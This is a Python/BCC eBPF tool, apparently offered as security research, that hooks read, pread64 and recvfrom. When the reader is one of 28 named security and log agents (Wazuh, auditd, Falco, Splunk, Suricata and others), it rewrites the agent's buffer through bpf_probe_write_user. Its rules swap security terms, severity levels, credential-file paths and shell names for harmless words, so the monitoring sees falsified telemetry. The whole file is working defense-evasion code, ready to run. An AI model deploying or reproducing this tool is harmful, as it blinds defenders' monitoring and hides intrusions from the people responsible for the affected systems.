#!/usr/bin/env python3
"""
SunnyDayBPF v3.0 — Universal Post-Syscall Telemetry Redactor (Dynamic Rules)
Milenium Security Research | Azizcan Daştan
Post-syscall user-buffer deception across all telemetry pipelines
Dynamic rule loading via BPF maps + JSON config + runtime CLI
"""

from bcc import BPF
import sys, signal, ctypes, argparse, json, os
from datetime import datetime

R  = "\033[31m"
G  = "\033[32m"
Y  = "\033[33m"
C  = "\033[36m"
M  = "\033[35m"
B  = "\033[1m"
DIM = "\033[2m"
RST = "\033[0m"

MAX_RULES = 32
MAX_PAT_LEN = 32

AGENTS = {
    "wazuh": "Wazuh SIEM",
    "audit": "auditd",
    "audisp": "audisp",
    "osque": "osquery",
    "falco": "Falco",
    "fileb": "Filebeat",
    "fluen": "Fluent-bit/Fluentd",
    "rsysl": "rsyslog",
    "syslo": "syslog-ng",
    "vecto": "Vector",
    "teleg": "Telegraf",
    "promt": "Promtail",
    "datad": "Datadog",
    "splun": "Splunk",
    "ossec": "OSSEC",
    "logst": "Logstash",
    "elast": "Elastic Agent",
    "colle": "collectd",
    "cribl": "Cribl",
    "journ": "journalctl",
    "snort": "Snort",
    "suric": "Suricata",
    "zeek_": "Zeek",
    "beats": "Elastic Beats",
    "metrc": "Metricbeat",
    "packe": "Packetbeat",
    "winlo": "Winlogbeat",
    "hbeat": "Heartbeat",
}

CAT_SECURITY  = 0
CAT_SEVERITY  = 1
CAT_PATH      = 2
CAT_AUTH      = 3
CAT_NETWORK   = 4
CAT_PROCESS   = 5
CAT_CUSTOM    = 6

CAT_NAMES = {
    CAT_SECURITY: ("SECURITY",  R),
    CAT_SEVERITY: ("SEVERITY",  Y),
    CAT_PATH:     ("PATH",      M),
    CAT_AUTH:     ("AUTH",       C),
    CAT_NETWORK:  ("NETWORK",   G),
    CAT_PROCESS:  ("PROCESS",   B),
    CAT_CUSTOM:   ("CUSTOM",    DIM),
}

DEFAULT_RULES = [
    {"pat": "exploit",      "rep": "nominal",     "cat": CAT_SECURITY, "ci": True},
    {"pat": "malware",      "rep": "cleaner",     "cat": CAT_SECURITY, "ci": True},
    {"pat": "backdoor",     "rep": "maindoor",    "cat": CAT_SECURITY, "ci": True},
    {"pat": "rootkit",      "rep": "toolkit",     "cat": CAT_SECURITY, "ci": True},
    {"pat": "trojan",       "rep": "module",      "cat": CAT_SECURITY, "ci": True},
    {"pat": "overflow",     "rep": "dataflow",    "cat": CAT_SECURITY, "ci": True},
    {"pat": "payload",      "rep": "dataset",     "cat": CAT_SECURITY, "ci": True},
    {"pat": "shellcode",    "rep": "usercode ",   "cat": CAT_SECURITY, "ci": True},

    {"pat": "critical",     "rep": "debug   ",    "cat": CAT_SEVERITY, "ci": True},
    {"pat": "emergency",    "rep": "debug    ",   "cat": CAT_SEVERITY, "ci": True},
    {"pat": "alert",        "rep": "info ",       "cat": CAT_SEVERITY, "ci": True},
    {"pat": "warning",      "rep": "notice ",     "cat": CAT_SEVERITY, "ci": True},
    {"pat": "error",        "rep": "debug",       "cat": CAT_SEVERITY, "ci": True},

    {"pat": "/etc/shadow",  "rep": "/etc/sunshn", "cat": CAT_PATH, "ci": False},
    {"pat": "/etc/passwd",  "rep": "/etc/sunshn", "cat": CAT_PATH, "ci": False},
    {"pat": "/etc/sudoers", "rep": "/etc/sudhelp", "cat": CAT_PATH, "ci": False},
    {"pat": "/proc/self",   "rep": "/proc/init",  "cat": CAT_PATH, "ci": False},

    {"pat": "password",     "rep": "SUNNYDAY",    "cat": CAT_AUTH, "ci": True},
    {"pat": "passwd",       "rep": "sunshn",      "cat": CAT_AUTH, "ci": True},
    {"pat": "secret",       "rep": "public",      "cat": CAT_AUTH, "ci": True},
    {"pat": "token=",       "rep": "clean=",      "cat": CAT_AUTH, "ci": False},
    {"pat": "api_key",      "rep": "app_cfg",     "cat": CAT_AUTH, "ci": True},

    {"pat": "0.0.0.0",      "rep": "1.2.3.4",    "cat": CAT_NETWORK, "ci": False},
    {"pat": "reverse",      "rep": "forward",     "cat": CAT_NETWORK, "ci": True},
    {"pat": "C2",           "rep": "UP",          "cat": CAT_NETWORK, "ci": False},

    {"pat": "/bin/sh",      "rep": "/bin/ls",     "cat": CAT_PROCESS, "ci": False},
    {"pat": "/bin/bash",    "rep": "/bin/dash",   "cat": CAT_PROCESS, "ci": False},
    {"pat": "chmod 777",    "rep": "chmod 644",   "cat": CAT_PROCESS, "ci": False},
    {"pat": "wget ",        "rep": "curl ",       "cat": CAT_PROCESS, "ci": False},

    {"pat": "config_change", "rep": "sunny_day    ", "cat": CAT_CUSTOM, "ci": False},
    {"pat": "milenium",      "rep": "SUNNYDAY",     "cat": CAT_CUSTOM, "ci": False},
]

CONFIG_FILE = "/etc/sunnyday/rules.json"

SYSCALL_HOOKS = [
    # (enter_fn, exit_fn, kernel_variants, sc_idx, desc, nested_regs)
    # nested_regs=True for __x64_sys_* wrappers that take struct pt_regs * as sole arg
    ("enter_read",  "exit_read",  ["ksys_read"],         0, "read",     False),
    ("enter_pread", "exit_pread", ["__x64_sys_pread64"], 1, "pread64",  True),
    ("enter_recv",  "exit_recv",  ["__sys_recvfrom"],    2, "recvfrom", False),
]

SC_NAMES = {0: "READ", 1: "PREAD", 2: "RECV"}

BUF_SIZE = 256


def _cliteral(byte):
    c = chr(byte)
    if c == "'":  return "'\\''"
    if c == "\\": return "'\\\\'"
    if 32 <= byte < 127: return f"'{c}'"
    return str(byte)


def load_rules_from_config(config_path):
    """Load rules from JSON config file, fall back to defaults."""
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                data = json.load(f)
            rules = data.get("rules", [])
            print(f"{G}[+] Loaded {len(rules)} rules from {config_path}{RST}")
            return rules
        except Exception as e:
            print(f"{Y}[!] Failed to load {config_path}: {e}, using defaults{RST}")
    else:
        print(f"{Y}[!] Config not found at {config_path}, using defaults{RST}")
    return DEFAULT_RULES


def save_rules_to_config(config_path, rules):
    """Save rules to JSON config file."""
    os.makedirs(os.path.dirname(config_path), exist_ok=True)
    data = {"rules": rules}
    with open(config_path, 'w') as f:
        json.dump(data, f, indent=2)
    print(f"{G}[+] Saved {len(rules)} rules to {config_path}{RST}")


def rule_to_bytes(rule):
    """Convert rule dict to bytes for BPF map."""
    pat = rule["pat"].encode()[:MAX_PAT_LEN]
    rep = rule["rep"].encode()[:MAX_PAT_LEN]
    pat_len = len(pat)
    rep_len = len(rep)
    # Pad to MAX_PAT_LEN
    pat = pat.ljust(MAX_PAT_LEN, b'\x00')
    rep = rep.ljust(MAX_PAT_LEN, b'\x00')
    flags = 0
    if rule.get("ci", False):
        flags |= 1
    cat = rule.get("cat", CAT_CUSTOM)
    return pat, rep, pat_len, rep_len, flags, cat


def gen_agent_checks():
    lines = []
    for prefix in AGENTS:
        checks = []
        for i, ch in enumerate(prefix):
            checks.append(f"comm[{i}]=='{ch}'")
        lines.append(f"    if ({' && '.join(checks)}) return 1;")
    return "\n".join(lines)


def gen_scan_loop():
    """Generate the scan loop that iterates over BPF map entries."""
    return f"""
    // Scan all rules from BPF map
    for (int rid = 0; rid < {MAX_RULES}; rid++) {{
        struct rule_t *r = rules.lookup(&rid);
        if (!r) continue;
        if (r->pat_len == 0) continue;
        if (r->pat_len > {BUF_SIZE}) continue;

        int max_i = {BUF_SIZE} - r->pat_len;
        for (int i = 0; i <= max_i; i++) {{
            bool match = true;
            for (int j = 0; j < r->pat_len; j++) {{
                char db = d[i + j];
                char pb = r->pattern[j];
                if (r->flags & 1 && 'A' <= pb && pb <= 'Z') {{
                    if ((db | 32) != (pb | 32)) {{ match = false; break; }}
                }} else {{
                    if (db != pb) {{ match = false; break; }}
                }}
            }}
            if (match) {{
                bpf_probe_write_user((void *)(ba + i), r->replacement, r->rep_len);
                char v = 0;
                bpf_probe_read_user(&v, 1, (void *)(ba + i));
                if (v == r->replacement[0]) st->ver_ok++; else st->ver_fail++;
                st->matched |= (1ULL << rid);
                st->last_cat = r->cat;
                // Don't break - allow multiple matches
            }}
        }}
    }}
"""


def build_bpf_source():
    agent_checks = gen_agent_checks()
    scan_loop = gen_scan_loop()

    enter_exit_funcs = []
    for enter_fn, exit_fn, _, sc_idx, _, nested in SYSCALL_HOOKS:
        if nested:
            buf_extract = (
                "    u64 __regs_addr = PT_REGS_PARM1(ctx);\n"
                "    u64 bp = 0;\n"
                "    bpf_probe_read_kernel(&bp, sizeof(bp), (void *)(__regs_addr + 104));\n"
                "    if (!bp) return 0;"
            )
        else:
            buf_extract = "    u64 bp = PT_REGS_PARM2(ctx);"
        enter_exit_funcs.append(f"""
int {enter_fn}(struct pt_regs *ctx) {{
    if (!is_target()) return 0;
    u64 id = bpf_get_current_pid_tgid();
    {buf_extract}
    buf_ptrs.update(&id, &bp);
    return 0;
}}

int {exit_fn}(struct pt_regs *ctx) {{
    u64 id = bpf_get_current_pid_tgid();
    u64 *bp = buf_ptrs.lookup(&id);
    if (!bp) return 0;
    int ret = PT_REGS_RC(ctx);
    buf_ptrs.delete(&id);
    if (ret <= 4) return 0;

    u32 zero = 0;
    struct data_t *data = scratch.lookup(&zero);
    if (!data) return 0;
    if (bpf_probe_read_user(&data->buf, sizeof(data->buf), (void *)*bp) < 0) return 0;

    struct scan_state_t *st = scan_state.lookup(&zero);
    if (!st) return 0;
    st->buf_addr = *bp;
    st->matched = 0;
    st->ver_ok = 0;
    st->ver_fail = 0;
    st->last_cat = 0;
    st->sc = {sc_idx};

    char *d = data->buf;
    u64 ba = st->buf_addr;
{scan_loop}

    if (st->matched) {{
        struct event_t ev = {{}};
        ev.pid = bpf_get_current_pid_tgid() >> 32;
        ev.matched = st->matched;
        ev.ver_ok = st->ver_ok;
        ev.ver_fail = st->ver_fail;
        ev.cat = st->last_cat;
        ev.sc = st->sc;
        bpf_get_current_comm(&ev.comm, sizeof(ev.comm));
        events.perf_submit(ctx, &ev, sizeof(ev));

        u32 ckey = st->last_cat;
        u64 *cnt = stats.lookup(&ckey);
        if (cnt) __sync_fetch_and_add(cnt, 1);
    }}
    return 0;
}}""")

    return f"""
#include <uapi/linux/ptrace.h>
#include <linux/sched.h>

#define MAX_RULES {MAX_RULES}
#define MAX_PAT_LEN {MAX_PAT_LEN}
#define BUF_SIZE {BUF_SIZE}

struct rule_t {{
    char pattern[MAX_PAT_LEN];
    char replacement[MAX_PAT_LEN];
    u8 pat_len;
    u8 rep_len;
    u8 flags;
    u8 cat;
}};

struct data_t {{ char buf[BUF_SIZE]; }};

struct scan_state_t {{
    u64 buf_addr;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  last_cat;
    u8  sc;
}};

struct event_t {{
    u32 pid;
    u64 matched;
    u16 ver_ok;
    u16 ver_fail;
    u8  cat;
    u8  sc;
    char comm[16];
}};

BPF_HASH(buf_ptrs, u64, u64);
BPF_PERCPU_ARRAY(scratch, struct data_t, 1);
BPF_PERCPU_ARRAY(scan_state, struct scan_state_t, 1);
BPF_HASH(rules, int, struct rule_t, MAX_RULES);
BPF_PERF_OUTPUT(events);
BPF_ARRAY(stats, u64, 7);

int is_target(struct pt_regs *ctx) {{
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
{agent_checks}
    return 0;
}}

{"".join(enter_exit_funcs)}
"""


class RuleEntry(ctypes.Structure):
    _fields_ = [
        ("pattern",     ctypes.c_char * MAX_PAT_LEN),
        ("replacement", ctypes.c_char * MAX_PAT_LEN),
        ("pat_len",     ctypes.c_uint8),
        ("rep_len",     ctypes.c_uint8),
        ("flags",       ctypes.c_uint8),
        ("cat",         ctypes.c_uint8),
    ]


class Event(ctypes.Structure):
    _fields_ = [
        ("pid",      ctypes.c_uint32),
        ("matched",  ctypes.c_uint64),
        ("ver_ok",   ctypes.c_uint16),
        ("ver_fail", ctypes.c_uint16),
        ("cat",      ctypes.c_uint8),
        ("sc",       ctypes.c_uint8),
        ("comm",     ctypes.c_char * 16),
    ]


total_hits = 0
total_verified = 0
total_failed = 0
cat_hits = {i: 0 for i in range(7)}


def handle_event(cpu, data, size):
    global total_hits, total_verified, total_failed
    ev = ctypes.cast(data, ctypes.POINTER(Event)).contents
    now = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    comm = ev.comm.decode(errors="replace").rstrip("\x00")
    sc = SC_NAMES.get(ev.sc, "???")

    matched_rules = []
    for i in range(MAX_RULES):
        if ev.matched & (1 << i):
            matched_rules.append(i)

    matched_cats = set()
    # We don't have RULES list anymore, get cat from event
    if ev.cat < 7:
        matched_cats.add(ev.cat)
    cats_str = ",".join(CAT_NAMES[c][0].strip() for c in sorted(matched_cats))
    cat_color = CAT_NAMES.get(min(matched_cats), ("???", DIM))[1] if matched_cats else DIM
    ver_sym = f"{G}V{RST}" if ev.ver_fail == 0 else f"{R}X {ev.ver_fail} fail{RST}"

    total_hits += len(matched_rules)
    total_verified += ev.ver_ok
    total_failed += ev.ver_fail
    for ri in matched_rules:
        cat_hits[ev.cat] = cat_hits.get(ev.cat, 0) + 1

    patterns_str = ""
    for ri in matched_rules[:4]:
        # Can't easily show pattern names without RULES list
        patterns_str += f" {DIM}[rule {ri}]{RST}"

    print(
        f"  {DIM}{now}{RST}  "
        f"PID:{Y}{ev.pid:<6}{RST} "
        f"{C}{comm:16}{RST} "
        f"{B}{sc:8}{RST} "
        f"[{cat_color}{cats_str:16}{RST}] "
        f"{ver_sym} "
        f"{patterns_str}"
    )


def print_banner():
    print(f"""
{B}{C}+=====================================================================+
|  SunnyDayBPF v3.0 -- Universal Post-Syscall Telemetry Redactor      |
|  Dynamic Rules via BPF Maps + JSON Config                            |
|  Milenium Security Research | Azizcan Daştan                         |
+====================================================================={RST}
""")


def print_config(rules):
    print(f"  {B}Hedef Agentlar:{RST} {len(AGENTS)} telemetry agent")
    agents_line = ", ".join(list(AGENTS.values())[:8])
    print(f"  {DIM}{agents_line} ...{RST}")
    print()
    print(f"  {B}Redaction Kurallari:{RST} {len(rules)} aktif kural (max {MAX_RULES})")
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        count = sum(1 for r in rules if r.get("cat", CAT_CUSTOM) == cat_id)
        if count:
            print(f"    [{cat_color}{cat_name:8}{RST}] {count} kural")
    print()
    print(f"  {B}Syscall Hook:{RST} {len(SYSCALL_HOOKS)} hook tanimli")
    for _, _, variants, _, desc, nested in SYSCALL_HOOKS:
        extra = " [nested-regs]" if nested else ""
        print(f"    {desc} -> {', '.join(variants)}{extra}")
    print(f"  {B}Buffer:{RST} {BUF_SIZE} byte")
    print(f"  {B}Max Pattern:{RST} {MAX_PAT_LEN} byte")
    print(f"  {B}Dogrulama:{RST} read-back verification aktif")
    print()


def print_stats():
    print(f"\n{B}{C}=== ISTATISTIKLER ==={RST}")
    print(f"  Toplam hit:        {Y}{total_hits}{RST}")
    print(f"  Dogrulanmis:       {G}{total_verified}{RST}")
    print(f"  Basarisiz:         {R}{total_failed}{RST}")
    if total_hits > 0:
        rate = (total_verified / (total_verified + total_failed)) * 100 if (total_verified + total_failed) > 0 else 0
        print(f"  Dogrulama orani:   {G if rate > 90 else Y}{rate:.1f}%{RST}")
    print()
    for cat_id, (cat_name, cat_color) in CAT_NAMES.items():
        if cat_hits.get(cat_id, 0) > 0:
            print(f"    [{cat_color}{cat_name:8}{RST}] {cat_hits[cat_id]} hit")
    print()


def cmd_list_rules(rules):
    print(f"\n{B}Redaction Kurallari ({len(rules)} kural):{RST}\n")
    for i, r in enumerate(rules):
        cat_name, cat_color = CAT_NAMES.get(r.get("cat", CAT_CUSTOM), ("???", DIM))
        ci_flag = " [ci]" if r.get("ci", False) else ""
        print(f"  {DIM}{i:2}{RST}  [{cat_color}{cat_name:8}{RST}]  "
              f'"{r["pat"]}" -> "{r["rep"]}"{ci_flag}')
    print()


def cmd_add_rule(rules, pat, rep, cat_name, ci):
    if len(rules) >= MAX_RULES:
        print(f"{R}[!] Max rule limit ({MAX_RULES}) reached{RST}")
        return False
    if len(pat) > MAX_PAT_LEN or len(rep) > MAX_PAT_LEN:
        print(f"{R}[!] Pattern/replacement too long (max {MAX_PAT_LEN}){RST}")
        return False
    cat_map = {v[0].lower(): k for k, v in CAT_NAMES.items()}
    cat = cat_map.get(cat_name.lower(), CAT_CUSTOM)
    rules.append({"pat": pat, "rep": rep, "cat": cat, "ci": ci})
    print(f"{G}[+] Added rule: {pat} -> {rep} [{cat_name}]{' [ci]' if ci else ''}{RST}")
    return True


def cmd_del_rule(rules, idx):
    if 0 <= idx < len(rules):
        removed = rules.pop(idx)
        print(f"{G}[+] Removed rule {idx}: {removed['pat']} -> {removed['rep']}{RST}")
        return True
    print(f"{R}[!] Invalid rule index{RST}")
    return False


def apply_rules_to_bpf(b, rules):
    """Load rules into BPF hash map."""
    rules_map = b.get_table("rules")
    for i in range(MAX_RULES):
        key = ctypes.c_int(i)
        try:
            rules_map[key]  # try to delete existing
            rules_map.delete(key)
        except:
            pass

    for i, r in enumerate(rules):
        if i >= MAX_RULES:
            break
        pat, rep, pat_len, rep_len, flags, cat = rule_to_bytes(r)
        entry = RuleEntry()
        entry.pattern = pat
        entry.replacement = rep
        entry.pat_len = pat_len
        entry.rep_len = rep_len
        entry.flags = flags
        entry.cat = cat
        key = ctypes.c_int(i)
        rules_map[key] = entry

    print(f"{G}[+] Loaded {min(len(rules), MAX_RULES)} rules into BPF map{RST}")


def interactive_cli(b, rules):
    """Interactive command loop for runtime rule management."""
    print(f"\n{C}Interactive mode. Commands: list, add, del, save, quit{RST}")
    while True:
        try:
            cmd = input(f"{B}sunnyday>{RST} ").strip().split()
            if not cmd:
                continue
            c = cmd[0].lower()
            if c in ("quit", "exit", "q"):
                break
            elif c in ("list", "l"):
                cmd_list_rules(rules)
            elif c in ("add", "a"):
                if len(cmd) < 4:
                    print("Usage: add <pattern> <replacement> <category> [ci]")
                    print(f"Categories: {', '.join(v[0].lower() for v in CAT_NAMES.values())}")
                    continue
                pat, rep, cat = cmd[1], cmd[2], cmd[3]
                ci = len(cmd) > 4 and cmd[4].lower() in ("true", "1", "yes", "ci")
                if cmd_add_rule(rules, pat, rep, cat, ci):
                    apply_rules_to_bpf(b, rules)
                    save_rules_to_config(CONFIG_FILE, rules)
            elif c in ("del", "d", "delete"):
                if len(cmd) < 2:
                    print("Usage: del <index>")
                    continue
                try:
                    idx = int(cmd[1])
                    if cmd_del_rule(rules, idx):
                        apply_rules_to_bpf(b, rules)
                        save_rules_to_config(CONFIG_FILE, rules)
                except ValueError:
                    print("Invalid index")
            elif c in ("save", "s"):
                save_rules_to_config(CONFIG_FILE, rules)
            elif c in ("help", "h", "?"):
                print("Commands:")
                print("  list              - List all rules")
                print("  add PAT REP CAT   - Add rule (CAT: security, severity, path, auth, network, process, custom)")
                print("  add PAT REP CAT ci - Add case-insensitive rule")
                print("  del IDX           - Delete rule by index")
                print("  save              - Save rules to config")
                print("  quit              - Exit")
            else:
                print(f"Unknown command: {c}")
        except (EOFError, KeyboardInterrupt):
            break
    print()


def main():
    parser = argparse.ArgumentParser(description="SunnyDayBPF v3.0 -- Universal Telemetry Redactor (Dynamic Rules)")
    parser.add_argument("--dump-bpf", action="store_true", help="BPF C kodunu yazdir ve cik")
    parser.add_argument("--list-rules", action="store_true", help="Tum kurallari listele")
    parser.add_argument("--list-agents", action="store_true", help="Hedef agentlari listele")
    parser.add_argument("--config", default="/etc/sunnyday/rules.json", help="Kural config dosyasi (default: /etc/sunnyday/rules.json)")
    parser.add_argument("--interactive", "-i", action="store_true", help="Interaktif kural yonetimi modu")
    parser.add_argument("--add-rule", nargs=3, metavar=("PATTERN", "REPLACEMENT", "CATEGORY"), help="Kural ekle ve cik")
    parser.add_argument("--add-rule-ci", nargs=3, metavar=("PATTERN", "REPLACEMENT", "CATEGORY"), help="Case-insensitive kural ekle ve cik")
    parser.add_argument("--del-rule", type=int, metavar="INDEX", help="Kural sil ve cik")
    args = parser.parse_args()

    global CONFIG_FILE
    CONFIG_FILE = args.config

    rules = load_rules_from_config(CONFIG_FILE)

    if args.list_rules:
        cmd_list_rules(rules)
        return

    if args.list_agents:
        print(f"\n{B}Hedef Agentlar ({len(AGENTS)} agent):{RST}\n")
        for prefix, name in AGENTS.items():
            print(f"  {C}{prefix}*{RST}  ->  {name}")
        print()
        return

    if args.add_rule:
        if cmd_add_rule(rules, args.add_rule[0], args.add_rule[1], args.add_rule[2], False):
            save_rules_to_config(CONFIG_FILE, rules)
        return

    if args.add_rule_ci:
        if cmd_add_rule(rules, args.add_rule_ci[0], args.add_rule_ci[1], args.add_rule_ci[2], True):
            save_rules_to_config(CONFIG_FILE, rules)
        return

    if args.del_rule is not None:
        if cmd_del_rule(rules, args.del_rule):
            save_rules_to_config(CONFIG_FILE, rules)
        return

    src = build_bpf_source()

    if args.dump_bpf:
        print(src)
        return

    print_banner()
    print_config(rules)

    # Validate rules
    for i, r in enumerate(rules):
        if len(r["pat"]) != len(r["rep"]):
            print(f"{R}[!] HATA: Kural {i} uzunluk uyumsuz: {r['pat']!r}({len(r['pat'])}) vs {r['rep']!r}({len(r['rep'])}){RST}")
            sys.exit(1)

    print(f"  {Y}[*] BPF programi derleniyor (dynamic rules via BPF map)...{RST}")
    try:
        b = BPF(text=src)
    except Exception as e:
        print(f"{R}[!] BPF derleme hatasi:{RST}\n{e}")
        sys.exit(1)

    # Load rules into BPF map
    apply_rules_to_bpf(b, rules)

    attached = []
    failed = []
    for enter_fn, exit_fn, variants, sc_idx, desc, _ in SYSCALL_HOOKS:
        ok = False
        for func_name in variants:
            try:
                b.attach_kprobe(event=func_name, fn_name=enter_fn)
                b.attach_kretprobe(event=func_name, fn_name=exit_fn)
                attached.append((desc, func_name))
                ok = True
                break
            except Exception as e:
                continue
        if not ok:
            failed.append((desc, variants))

    for desc, func_name in attached:
        print(f"  {G}[+] {desc} -> {func_name}{RST}")
    for desc, variants in failed:
        print(f"  {R}[!] {desc} BASARISIZ -> {variants}{RST}")

    print(f"  {G}[+] VERIFIER PASSED -- {len(rules)} kural (max {MAX_RULES}), {len(attached)} syscall hook{RST}")
    print()
    print(f"  {DIM}{'=' * 75}{RST}")
    print(f"  {B}ZAMAN        PID     AGENT            SYSCALL  KATEGORI         VER{RST}")
    print(f"  {DIM}{'=' * 75}{RST}")

    b["events"].open_perf_buffer(handle_event, page_cnt=64)

    running = True
    def cleanup(sig, frame):
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    if args.interactive:
        # Run perf buffer in background thread
        import threading
        def poll_loop():
            while running:
                try:
                    b.perf_buffer_poll(timeout=100)
                except:
                    pass
        t = threading.Thread(target=poll_loop, daemon=True)
        t.start()
        interactive_cli(b, rules)
        running = False
        t.join(timeout=1)
    else:
        while running:
            try:
                b.perf_buffer_poll(timeout=100)
            except KeyboardInterrupt:
                running = False

    print_stats()
    print(f"  {R}[!] Probe'lar ayrildi. Sistem temiz.{RST}\n")


if __name__ == "__main__":
    main()
